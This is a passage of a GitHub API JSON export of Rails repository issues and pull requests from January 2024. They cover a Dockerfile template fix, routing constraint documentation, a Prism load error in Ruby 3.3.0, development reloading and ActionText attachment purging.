            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50712/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50711",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50711/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50711/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50711/events",
        "html_url": "https://github.com/rails/rails/pull/50711",
        "id": 2077179836,
        "node_id": "PR_kwDNIULOY9YPzw",
        "number": 50711,
        "title": "Updating Dockerfile template to include working code",
        "user": {
            "login": "ankurp",
            "id": 498669,
            "node_id": "MDQ6VXNlcjQ5ODY2OQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/498669?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ankurp",
            "html_url": "https://github.com/ankurp",
            "followers_url": "https://api.github.com/users/ankurp/followers",
            "following_url": "https://api.github.com/users/ankurp/following{/other_user}",
            "gists_url": "https://api.github.com/users/ankurp/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ankurp/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ankurp/subscriptions",
            "organizations_url": "https://api.github.com/users/ankurp/orgs",
            "repos_url": "https://api.github.com/users/ankurp/repos",
            "events_url": "https://api.github.com/users/ankurp/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ankurp/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-11T17:03:08Z",
        "updated_at": "2024-01-15T02:01:04Z",
        "closed_at": "2024-01-15T02:01:04Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50711",
            "html_url": "https://github.com/rails/rails/pull/50711",
            "diff_url": "https://github.com/rails/rails/pull/50711.diff",
            "patch_url": "https://github.com/rails/rails/pull/50711.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nWhen making a new rails application with asset pipeline, the Dockerfile generate does not work out of box. Dockerfile requires manual editing to get it to work as should in production environment by pass `RAILS_MASTER_KEY` during build process as ARG. When using `kamal` to deploy this ARG is passed to the `docker build` command and should be the default pattern unless developers want something else.\r\n\r\nThis Pull Request has been created because the default Dockerfile template that generates the Dockerfile does not work in production env and should be updated.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes Dockerfile.tt\r\n\r\n### Additional information\r\n\r\nI used `kamal` to deploy and this default generated file does not work when trying to deploy Docker container to Production.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50711/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50711/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50710",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50710/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50710/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50710/events",
        "html_url": "https://github.com/rails/rails/pull/50710",
        "id": 2077153009,
        "node_id": "PR_kwDNIULOY9Wvpg",
        "number": 50710,
        "title": "Update `ActionDispatch::Routing::Mapper:Scoping#constraints` documentation",
        "user": {
            "login": "stevepolitodesign",
            "id": 5122678,
            "node_id": "MDQ6VXNlcjUxMjI2Nzg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5122678?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/stevepolitodesign",
            "html_url": "https://github.com/stevepolitodesign",
            "followers_url": "https://api.github.com/users/stevepolitodesign/followers",
            "following_url": "https://api.github.com/users/stevepolitodesign/following{/other_user}",
            "gists_url": "https://api.github.com/users/stevepolitodesign/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/stevepolitodesign/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/stevepolitodesign/subscriptions",
            "organizations_url": "https://api.github.com/users/stevepolitodesign/orgs",
            "repos_url": "https://api.github.com/users/stevepolitodesign/repos",
            "events_url": "https://api.github.com/users/stevepolitodesign/events{/privacy}",
            "received_events_url": "https://api.github.com/users/stevepolitodesign/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-11T16:50:31Z",
        "updated_at": "2024-01-11T16:50:36Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50710",
            "html_url": "https://github.com/rails/rails/pull/50710",
            "diff_url": "https://github.com/rails/rails/pull/50710.diff",
            "patch_url": "https://github.com/rails/rails/pull/50710.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nThe previous recommendation to place constraints in `lib/constraints` did not work in practice on a default Rails install, as it will raise the following:\r\n\r\n```\r\nuninitialized constant Iphone (NameError)\r\n```\r\n\r\nInstead, recommend placing constraints in `app/constraints` such that they will be eager loaded.\r\n\r\n### Additional information\r\n\r\nAlternatively, we could update the documentation to elaborate that `lib/constraints` would need to be explicitly eager loaded.\r\n\r\n```ruby\r\nconfig.eager_load_paths << Rails.root.join(\"lib/constraints\")\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50710/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50710/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50709",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50709/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50709/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50709/events",
        "html_url": "https://github.com/rails/rails/issues/50709",
        "id": 2076750931,
        "node_id": "I_kwDNIULOe8i0Uw",
        "number": 50709,
        "title": "Tests fail to load Prism properly in Ruby 3.3.0",
        "user": {
            "login": "gazayas",
            "id": 10546292,
            "node_id": "MDQ6VXNlcjEwNTQ2Mjky",
            "avatar_url": "https://avatars.githubusercontent.com/u/10546292?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gazayas",
            "html_url": "https://github.com/gazayas",
            "followers_url": "https://api.github.com/users/gazayas/followers",
            "following_url": "https://api.github.com/users/gazayas/following{/other_user}",
            "gists_url": "https://api.github.com/users/gazayas/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gazayas/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gazayas/subscriptions",
            "organizations_url": "https://api.github.com/users/gazayas/orgs",
            "repos_url": "https://api.github.com/users/gazayas/repos",
            "events_url": "https://api.github.com/users/gazayas/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gazayas/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-11T14:05:41Z",
        "updated_at": "2024-01-11T23:38:09Z",
        "closed_at": "2024-01-11T15:50:11Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Ruby 3.3.0 supports Prism out of the box, so Rails applications with dependencies that require Prism don't need to explicitly define the `prism` gem in their Gemfile/gemspec anymore. However, when updating to Ruby 3.3.0, `require \"prism\"` invoked this way won't work when running tests.\r\n\r\n### Steps to reproduce\r\n```\r\n$ rails new prism_issue\r\n$ cd prism_issue\r\n\r\n# Generate a model to test against.\r\n$ rails g model Foo bar:string\r\n      invoke  active_record\r\n      create    db/migrate/20240111132518_create_foos.rb\r\n      create    app/models/foo.rb\r\n      invoke    test_unit\r\n      create      test/models/foo_test.rb\r\n      create      test/fixtures/foos.yml\r\n$ rails db:migrate\r\n== 20240111132518 CreateFoos: migrating =======================================\r\n-- create_table(:foos)\r\n   -> 0.0018s\r\n== 20240111132518 CreateFoos: migrated (0.0019s) ==============================\r\n```\r\n\r\nAdd `require \"prism\"` in `config/application` to emulate requiring from a dependency.\r\n```ruby\r\nrequire_relative \"boot\"\r\n\r\nrequire \"rails/all\"\r\n\r\nrequire \"prism\"\r\nputs \"Constant is defined: #{Prism}\"\r\n\r\n# Require the gems listed in Gemfile, including any gems\r\n# you've limited to :test, :development, or :production.\r\nBundler.require(*Rails.groups)\r\n```\r\n\r\nRun tests.\r\n```\r\n$ bundle exec rails test\r\n```\r\n\r\n### Expected behavior\r\nTests should run without any issues.\r\n\r\n### Actual behavior\r\nThere is a `LoadError` for `prism/prism`, and Rails acts as if the migration that was run earlier hasn't been run yet. (Note that `Constant is defined: Prism` is output once, and then the `require` line fails).\r\n\r\n```\r\n> bundle exec rails test\r\nConstant is defined: Prism\r\nbin/rails aborted!\r\nLoadError: cannot load such file -- prism/prism (LoadError)\r\n/home/gazayas/ror/prism_issue/config/application.rb:9:in `<main>'\r\n/home/gazayas/ror/prism_issue/Rakefile:4:in `require_relative'\r\n/home/gazayas/ror/prism_issue/Rakefile:4:in `<main>'\r\nbin/rails:4:in `<main>'\r\n(See full trace by running task with --trace)\r\nMigrations are pending. To resolve this issue, run:\r\n\r\n        bin/rails db:migrate\r\n\r\nYou have 1 pending migration:\r\n\r\ndb/migrate/20240111132518_create_foos.rb\r\n```\r\n\r\n### System configuration\r\n**Rails version**:\r\n7.1.2\r\n\r\n**Ruby version**:\r\nruby 3.3.0 (2023-12-25 revision 5124f9ac75) [x86_64-linux]\r\nruby 3.3.0 (2023-12-25 revision 5124f9ac75) [x86_64-darwin21]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50709/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50709/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50708",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50708/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50708/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50708/events",
        "html_url": "https://github.com/rails/rails/pull/50708",
        "id": 2076529137,
        "node_id": "PR_kwDNIULOY8zvPw",
        "number": 50708,
        "title": "Prevent unnecessary application reloads in development",
        "user": {
            "login": "aeroastro",
            "id": 4468155,
            "node_id": "MDQ6VXNlcjQ0NjgxNTU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4468155?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/aeroastro",
            "html_url": "https://github.com/aeroastro",
            "followers_url": "https://api.github.com/users/aeroastro/followers",
            "following_url": "https://api.github.com/users/aeroastro/following{/other_user}",
            "gists_url": "https://api.github.com/users/aeroastro/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/aeroastro/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/aeroastro/subscriptions",
            "organizations_url": "https://api.github.com/users/aeroastro/orgs",
            "repos_url": "https://api.github.com/users/aeroastro/repos",
            "events_url": "https://api.github.com/users/aeroastro/events{/privacy}",
            "received_events_url": "https://api.github.com/users/aeroastro/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-11T12:37:14Z",
        "updated_at": "2024-01-12T03:05:04Z",
        "closed_at": "2024-01-11T19:10:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50708",
            "html_url": "https://github.com/rails/rails/pull/50708",
            "diff_url": "https://github.com/rails/rails/pull/50708.diff",
            "patch_url": "https://github.com/rails/rails/pull/50708.patch",
            "merged_at": "2024-01-11T19:10:14Z"
        },
        "body": "### Motivation / Background\r\n\r\nAs commented in https://github.com/rails/rails/issues/37011#issuecomment-1322560651,\r\npreviously, changes in some files outside the autoload paths triggered reloading application.\r\n\r\nFor instance, editing `app/README.md` would trigger a reload,\r\neven though the reloaded classes and modules, which were under autoload paths,\r\nwere identical to those loaded previously.\r\n\r\n### Detail\r\n\r\nThis PR fixes this issue by ensuring the application reloads correctly\r\naccording to `Rails.autoloaders.main.dirs`, thereby preventing unnecessary reloads.\r\n\r\n### Additional information\r\n\r\nI have fixed the issue according to the above comment.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50708/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50708/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50707",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50707/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50707/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50707/events",
        "html_url": "https://github.com/rails/rails/issues/50707",
        "id": 2076352518,
        "node_id": "I_kwDNIULOe8KgBg",
        "number": 50707,
        "title": "Would it be possible to pass dependent: false to ActionText::RichText",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-11T11:21:29Z",
        "updated_at": "2024-01-12T13:13:16Z",
        "closed_at": "2024-01-12T13:12:30Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "We had an issue where we were editing ActionText::RichText bodies and it started to purge files (images for instance).\r\n\r\nWould it be possible to configure globally a `has_many_attached :embeds, dependent: false` to not call `purge_later` that calls `service.delete`.\r\n\r\nhttps://github.com/rails/rails/blob/main/actiontext/app/models/action_text/rich_text.rb#L40\r\n\r\n```ruby\r\nmodule ActionText\r\n  class RichText < Record\r\n    serialize :body, coder: ActionText::Content\r\n    delegate :to_s, :nil?, to: :body\r\n\r\n    belongs_to :record, polymorphic: true, touch: true\r\n    has_many_attached :embeds\r\n    # ...\r\n  end\r\nend\r\n```\r\n\r\nI'm going to try if a patch works\r\n\r\nRuby version: not relevant but sharing in case `ruby 3.3.0 (2023-12-25 revision 5124f9ac75) +YJIT [arm64-darwin23]`\r\n\r\nRails version: `Rails 7.1.2` and main\r\n\r\nThanks, I'm going to try to come up with a pull request",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50707/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50707/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50706",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50706/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50706/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50706/events",
        "html_url": "https://github.com/rails/rails/pull/50706",
        "id": 2076042469,
        "node_id": "PR_kwDNIULOY8Yz5g",
        "number": 50706,
        "title": "Handle alternative base classes in `define_attribute_methods`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-01-11T08:31:42Z",
        "updated_at": "2024-01-15T22:56:35Z",
        "closed_at": "2024-01-15T16:28:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50706",
            "html_url": "https://github.com/rails/rails/pull/50706",
            "diff_url": "https://github.com/rails/rails/pull/50706.diff",
            "patch_url": "https://github.com/rails/rails/pull/50706.patch",
            "merged_at": "2024-01-15T16:28:44Z"
        },
        "body": "Ref: https://github.com/rails/rails/commit/d429bfb3b6fd2794f0d859b68e5dee24578d405f#r136670440\r\n\r\ncc @ghiculescu @rafaelfranca \r\n\r\nBefore merging, I'd like a repro, so I can include a test case though.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50706/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50706/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50705",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50705/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50705/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50705/events",
        "html_url": "https://github.com/rails/rails/pull/50705",
        "id": 2076034722,
        "node_id": "PR_kwDNIULOY8YYug",
        "number": 50705,
        "title": "Backport: Define missing attribute methods from `method_missing`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-11T08:26:24Z",
        "updated_at": "2024-02-28T09:18:38Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50705",
            "html_url": "https://github.com/rails/rails/pull/50705",
            "diff_url": "https://github.com/rails/rails/pull/50705.diff",
            "patch_url": "https://github.com/rails/rails/pull/50705.patch",
            "merged_at": null
        },
        "body": "Ref: https://github.com/rails/rails/pull/50594\r\n\r\nOpening a PR because the backport is non-trivial, so I want CI coverage. Also @ghiculescu pointed a possible issue in https://github.com/rails/rails/commit/d429bfb3b6fd2794f0d859b68e5dee24578d405f so I'd like to get to the bottom of that before merging the backport.\r\n\r\ncc @rafaelfranca ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50705/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50705/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50704",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50704/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50704/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50704/events",
        "html_url": "https://github.com/rails/rails/issues/50704",
        "id": 2075987214,
        "node_id": "I_kwDNIULOe70NDg",
        "number": 50704,
        "title": "Introduce Consolidated Methods for Common Check Operations",
        "user": {
            "login": "rehan-akmal",
            "id": 47142006,
            "node_id": "MDQ6VXNlcjQ3MTQyMDA2",
            "avatar_url": "https://avatars.githubusercontent.com/u/47142006?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rehan-akmal",
            "html_url": "https://github.com/rehan-akmal",
            "followers_url": "https://api.github.com/users/rehan-akmal/followers",
            "following_url": "https://api.github.com/users/rehan-akmal/following{/other_user}",
            "gists_url": "https://api.github.com/users/rehan-akmal/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rehan-akmal/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rehan-akmal/subscriptions",
            "organizations_url": "https://api.github.com/users/rehan-akmal/orgs",
            "repos_url": "https://api.github.com/users/rehan-akmal/repos",
            "events_url": "https://api.github.com/users/rehan-akmal/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rehan-akmal/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-11T07:55:29Z",
        "updated_at": "2024-01-11T09:39:54Z",
        "closed_at": "2024-01-11T09:39:54Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Problem\r\nIn our current Rails codebase, we frequently encounter situations where we need to check the presence, absence, or other conditions of multiple variables, which often results in long and repetitive code like this:\r\n```\r\nif a.present? && b.present? && c.present? && d.present? && e.present?\r\n  # Do something\r\nend\r\n```\r\nReading and maintaining such code can become cumbersome and error-prone, especially as the number of variables increases.\r\n### Proposal\r\nTo address this issue and enhance the readability and maintainability of our code, I think we can introduce consolidated methods for common check operations. These methods will simplify conditional checks on multiple variables and promote more elegant and DRY (Don't Repeat Yourself) coding practices.\r\n\r\n### Expected behavior\r\nNew Methods\r\n`all_present?` `any_present?`\r\n`all_nil?` `any_nil?`\r\n `all_balnk?` `any_blank?`\r\n `all_true?` `any_true?`\r\n `all_false?` `any_false?`\r\n\r\nWe can introduce these new methods, which will accept multiple variables as arguments and return true if all or any of the variables are present, respectively. This would allow us to rewrite the previous example as follows:\r\n```\r\nif all_present?(a, b, c, d, e)\r\n  Do something\r\nend\r\n\r\nif any_present?(a, b, c, d, e)\r\n  Do something\r\nend\r\n\r\nif all_nil?(a, b, c, d, e)\r\n  Do something\r\nend\r\n\r\nif any_nil?(a, b, c, d, e)\r\n  Do something\r\nend\r\n\r\n-- all_true?, all_blank? etc.\r\n```\r\n### Generalized Methods:\r\n\r\nAlternatively, we can create more generalized methods that accept both the operation (e.g., :present, :nil, :blank, :true, :false) and the variables to check. For instance, a method signature might look like  `check_all(operation, *variables)`\r\n```\r\nif check_all(:present, a, b, c, d, e)\r\n  Do something\r\nend\r\n\r\nif check_all(:nil, a, b, c, d, e)\r\n  Do something\r\nend\r\n```\r\n\r\nThis approach would provide flexibility for various types of checks beyond just presence.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50704/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50704/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    }
]